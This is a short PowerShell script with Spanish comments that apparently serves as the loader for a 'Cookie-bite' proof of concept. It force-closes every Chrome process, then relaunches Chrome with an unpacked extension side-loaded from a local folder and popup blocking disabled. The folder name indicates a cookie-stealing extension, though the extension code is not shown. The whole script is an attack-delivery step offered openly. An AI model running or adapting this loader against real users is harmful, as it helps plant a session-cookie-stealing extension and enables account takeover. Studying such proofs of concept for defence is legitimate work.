# Variables
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe" #Path chrome.exe
$extensionPath = "C:\Users\<USER>\Desktop\PoCCookie-bite"

# verificar que existe la extensión

if (!(Test-Path -Path $extensionPath)) 
{
    Write-Host "[!] No se ha encontrado la carpeta de la extensión: $extensionPath"
    exit
}

# Cerrar todas las instancias de Chrome
Get-Process -Name Chrome -ErrorAction SilentlyContinue | Stop-Process -Force

# Iniciar Chrome con las extensiones temporalmente cargadas
Start-Process -FilePath $chromePath -ArgumentList "--load-extension=`"$extensionPath`" --disable-popup-blocking"

Write-Host "[+] Extensión cargada exitosamente, abriendo navegador..."
